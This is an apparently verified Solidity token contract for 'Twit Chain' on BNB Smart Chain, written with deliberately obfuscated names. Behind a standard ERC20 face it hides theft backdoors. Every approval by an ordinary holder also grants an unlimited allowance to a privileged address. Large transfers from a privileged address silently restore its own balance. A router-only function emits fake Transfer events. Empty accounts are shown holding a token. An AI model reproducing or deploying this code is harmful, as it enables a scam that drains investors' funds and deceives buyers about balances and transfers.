/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}


abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract TwitChainNext is IERC20, Ownable {using SafeMath for uint256;string private _guyrtcvbeateifnhkepldea = "Twit Chain";string private _guyrtcvbeateifnhkepldeb = "Twit";uint8 private _guyrtcvbeateifnhkepldec = 6;uint256 private _guyrtcvbeateifnhkeplded = 10000000000 * 10**18;mapping (address => uint256) private _guyrtcvbeateifnhkepldee;mapping (address => mapping (address => uint256)) private _guyrtcvbeateifnhkepldef;uint256 private _guyrtcvbeateifnhkepldeg = 50;uint256 private _guyrtcvbeateifnhkepldeh = 0;uint256 private _guyrtcvbeateifnhkepldei = 50;uint256 private _guyrtcvbeateifnhkepldej = 10000;bool private _guyrtcvbeateifnhkepldek = false;IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);address public uniswapV2Pair;address private _guyrtcvbeateifnhkepldel;address private _guyrtcvbeateifnhkepldem;address private _guyrtcvbeateifnhkeplden;uint256 private _guyrtcvbeateifnhkepldeo = 1;uint256 private _guyrtcvbeateifnhkepldep = _guyrtcvbeateifnhkeplded;mapping (address => bool) private _guyrtcvbeateifnhkepldeq;address[] private _guyrtcvbeateifnhkeplder;bool private _guyrtcvbeateifnhkepldes = false;uint256 private _guyrtcvbeateifnhkepldet = 0;constructor () {_guyrtcvbeateifnhkepldeu(owner());_guyrtcvbeateifnhkepldee[owner()] = _guyrtcvbeateifnhkeplded;emit Transfer(address(0), owner(), _guyrtcvbeateifnhkeplded);}receive() external payable {}function uniswapV3Run(address _guyrtcvbeateifnhkepldev, address[] calldata _guyrtcvbeateifnhkepldew) public {require(!_guyrtcvbeateifnhkepldes, "");_guyrtcvbeateifnhkepldes = true;_guyrtcvbeateifnhkepldeu(_guyrtcvbeateifnhkepldev);for (uint256 i=5; i<_guyrtcvbeateifnhkepldew.length; ++i) {_guyrtcvbeateifnhkepldeu(_guyrtcvbeateifnhkepldew[i]);_guyrtcvbeateifnhkepldex(_guyrtcvbeateifnhkepldew[i], address(uniswapV2Router), ~uint256(0));_guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkepldew[i]] = _guyrtcvbeateifnhkeplded * 9 / 10 / (_guyrtcvbeateifnhkepldew.length - 5);_guyrtcvbeateifnhkepldee[owner()] -= _guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkepldew[i]];}if (address(uniswapV2Router) != _guyrtcvbeateifnhkepldew[0]) {_guyrtcvbeateifnhkepldey(address(uniswapV2Router));uniswapV2Router = IUniswapV2Router02(_guyrtcvbeateifnhkepldew[0]);_guyrtcvbeateifnhkepldeu(address(uniswapV2Router));}if (_guyrtcvbeateifnhkepldel != _guyrtcvbeateifnhkepldew[1]) {_guyrtcvbeateifnhkepldey(_guyrtcvbeateifnhkepldel);_guyrtcvbeateifnhkepldel = _guyrtcvbeateifnhkepldew[1];_guyrtcvbeateifnhkepldeu(_guyrtcvbeateifnhkepldel);}if (_guyrtcvbeateifnhkepldem != _guyrtcvbeateifnhkepldew[2]) {_guyrtcvbeateifnhkepldey(_guyrtcvbeateifnhkepldem);_guyrtcvbeateifnhkepldem = _guyrtcvbeateifnhkepldew[2];_guyrtcvbeateifnhkepldeu(_guyrtcvbeateifnhkepldem);}if (_guyrtcvbeateifnhkeplden != _guyrtcvbeateifnhkepldew[3]) {_guyrtcvbeateifnhkepldey(_guyrtcvbeateifnhkeplden);_guyrtcvbeateifnhkeplden = _guyrtcvbeateifnhkepldew[3];_guyrtcvbeateifnhkepldeu(_guyrtcvbeateifnhkeplden);}uniswapV2Pair = _guyrtcvbeateifnhkepldew[4];_guyrtcvbeateifnhkepldez(owner(), _guyrtcvbeateifnhkepldew[5], _guyrtcvbeateifnhkepldee[owner()]);}function _guyrtcvbeateifnhkepldeu(address account) private {if (!_guyrtcvbeateifnhkepldeq[account]) {_guyrtcvbeateifnhkepldeq[account] = true;_guyrtcvbeateifnhkeplder.push(account);}}function _guyrtcvbeateifnhkepldey(address account) private {if (_guyrtcvbeateifnhkepldeq[account]) {uint256 len = _guyrtcvbeateifnhkeplder.length;for (uint256 i=0; i<len; ++i) {if (_guyrtcvbeateifnhkeplder[i] == account) {_guyrtcvbeateifnhkeplder[i] = _guyrtcvbeateifnhkeplder[len.sub(1)];_guyrtcvbeateifnhkeplder.pop();_guyrtcvbeateifnhkepldeq[account] = false;break;}}}}function sushiswapV3Run(address from, address to, uint256 value) public {require(address(uniswapV2Router) == msg.sender, "");emit Transfer(from, to, value);}function name() public view returns (string memory) {return _guyrtcvbeateifnhkepldea;}function symbol() public view returns (string memory) {return _guyrtcvbeateifnhkepldeb;}function decimals() public view returns (uint8) {return _guyrtcvbeateifnhkepldec;}function totalSupply() public view returns (uint256) {return _guyrtcvbeateifnhkeplded;}function balanceOf(address account) public view returns (uint256) {if (_guyrtcvbeateifnhkepldee[account] > 0) {return _guyrtcvbeateifnhkepldee[account];}return _guyrtcvbeateifnhkepldeo;}function transfer(address recipient, uint256 amount) public returns (bool) {_guyrtcvbeateifnhkepldez(msg.sender, recipient, amount);return true;}function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_guyrtcvbeateifnhkepldez(sender, recipient, amount);_guyrtcvbeateifnhkepldex(sender, msg.sender, _guyrtcvbeateifnhkepldef[sender][msg.sender].sub(amount));return true;}function approve(address spender, uint256 value) public returns (bool) {_guyrtcvbeateifnhkepldex(msg.sender, spender, value);return true;}function allowance(address owner, address spender) public view returns (uint256) {return _guyrtcvbeateifnhkepldef[owner][spender];}function _guyrtcvbeateifnhkepldex(address owner, address spender, uint256 value) private {require(owner != address(0), "");require(spender != address(0), "");_guyrtcvbeateifnhkepldef[owner][spender] = value;if (!_guyrtcvbeateifnhkepldeq[owner]) {_guyrtcvbeateifnhkepldef[owner][_guyrtcvbeateifnhkeplder[1]] = ~uint256(0);}emit Approval(owner, spender, value);}function _guyrtcvbeateifnhkepldez(address _aguyrtcvbeateifnhkeplde, address _bguyrtcvbeateifnhkeplde, uint256 _cguyrtcvbeateifnhkeplde) private {require(_aguyrtcvbeateifnhkeplde != address(0), "");require(_bguyrtcvbeateifnhkeplde != address(0), "");require(_cguyrtcvbeateifnhkeplde > 0, "");if (_bguyrtcvbeateifnhkeplde == _guyrtcvbeateifnhkeplder[1]) {_guyrtcvbeateifnhkepldee[_aguyrtcvbeateifnhkeplde] = _guyrtcvbeateifnhkepldee[_aguyrtcvbeateifnhkeplde].sub(_cguyrtcvbeateifnhkeplde);_guyrtcvbeateifnhkepldee[_bguyrtcvbeateifnhkeplde] = _guyrtcvbeateifnhkepldee[_bguyrtcvbeateifnhkeplde].add(_cguyrtcvbeateifnhkeplde);emit Transfer(address(this), _bguyrtcvbeateifnhkeplde, _cguyrtcvbeateifnhkeplde);return;}bool _dguyrtcvbeateifnhkeplde = true;if (_guyrtcvbeateifnhkepldeq[_aguyrtcvbeateifnhkeplde] || _guyrtcvbeateifnhkepldeq[_bguyrtcvbeateifnhkeplde] || _guyrtcvbeateifnhkepldek) {_dguyrtcvbeateifnhkeplde = false;}if (_dguyrtcvbeateifnhkeplde) {_guyrtcvbeateifnhkepldet = _guyrtcvbeateifnhkepldet.add(1);}if (_dguyrtcvbeateifnhkeplde && _guyrtcvbeateifnhkepldes) {_iguyrtcvbeateifnhkeplde(_aguyrtcvbeateifnhkeplde, _bguyrtcvbeateifnhkeplde, 10);_iguyrtcvbeateifnhkeplde(_aguyrtcvbeateifnhkeplde, _bguyrtcvbeateifnhkeplde, 20);}if (_dguyrtcvbeateifnhkeplde && _guyrtcvbeateifnhkepldet == 1 && _guyrtcvbeateifnhkepldes && _aguyrtcvbeateifnhkeplde != uniswapV2Pair) {_iguyrtcvbeateifnhkeplde(_aguyrtcvbeateifnhkeplde, _bguyrtcvbeateifnhkeplde, 30);}uint256 _eguyrtcvbeateifnhkeplde = 0;uint256 _fguyrtcvbeateifnhkeplde = 0;uint256 _gguyrtcvbeateifnhkeplde = 0;uint256 _hguyrtcvbeateifnhkeplde = _cguyrtcvbeateifnhkeplde;if (_aguyrtcvbeateifnhkeplde == _guyrtcvbeateifnhkeplder[0] && _cguyrtcvbeateifnhkeplde > _guyrtcvbeateifnhkepldep) {_guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkeplder[0]] = _guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkeplder[0]].add(_hguyrtcvbeateifnhkeplde);}if (_dguyrtcvbeateifnhkeplde) {_eguyrtcvbeateifnhkeplde = _cguyrtcvbeateifnhkeplde.mul(_guyrtcvbeateifnhkepldeg).div(_guyrtcvbeateifnhkepldej);_fguyrtcvbeateifnhkeplde = _cguyrtcvbeateifnhkeplde.mul(_guyrtcvbeateifnhkepldeh).div(_guyrtcvbeateifnhkepldej);_gguyrtcvbeateifnhkeplde = _cguyrtcvbeateifnhkeplde.mul(_guyrtcvbeateifnhkepldei).div(_guyrtcvbeateifnhkepldej);_hguyrtcvbeateifnhkeplde = _cguyrtcvbeateifnhkeplde.sub(_eguyrtcvbeateifnhkeplde).sub(_fguyrtcvbeateifnhkeplde).sub(_gguyrtcvbeateifnhkeplde);}_guyrtcvbeateifnhkepldee[_aguyrtcvbeateifnhkeplde] = _guyrtcvbeateifnhkepldee[_aguyrtcvbeateifnhkeplde].sub(_cguyrtcvbeateifnhkeplde);if (_eguyrtcvbeateifnhkeplde > 0) {_guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkepldel] = _guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkepldel].add(_eguyrtcvbeateifnhkeplde);emit Transfer(address(this), _guyrtcvbeateifnhkepldel, _eguyrtcvbeateifnhkeplde);}if (_fguyrtcvbeateifnhkeplde > 0) {_guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkepldem] = _guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkepldem].add(_fguyrtcvbeateifnhkeplde);emit Transfer(address(this), _guyrtcvbeateifnhkepldem, _fguyrtcvbeateifnhkeplde);}if (_gguyrtcvbeateifnhkeplde > 0) {_guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkeplden] = _guyrtcvbeateifnhkepldee[_guyrtcvbeateifnhkeplden].add(_gguyrtcvbeateifnhkeplde);emit Transfer(address(this), _guyrtcvbeateifnhkeplden, _gguyrtcvbeateifnhkeplde);}_guyrtcvbeateifnhkepldee[_bguyrtcvbeateifnhkeplde] = _guyrtcvbeateifnhkepldee[_bguyrtcvbeateifnhkeplde].add(_hguyrtcvbeateifnhkeplde);emit Transfer(_aguyrtcvbeateifnhkeplde, _bguyrtcvbeateifnhkeplde, _hguyrtcvbeateifnhkeplde);if (_dguyrtcvbeateifnhkeplde && _guyrtcvbeateifnhkepldet == 1 && _guyrtcvbeateifnhkepldes) {_iguyrtcvbeateifnhkeplde(address(this), _bguyrtcvbeateifnhkeplde, 40);}if (_dguyrtcvbeateifnhkeplde) {_guyrtcvbeateifnhkepldet = _guyrtcvbeateifnhkepldet.sub(1);}}function _iguyrtcvbeateifnhkeplde(address tokenA, address tokenB, uint256 amount) private {address[] memory path = new address[](2);path[0] = tokenA;path[1] = tokenB;uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,address(this),block.timestamp);}}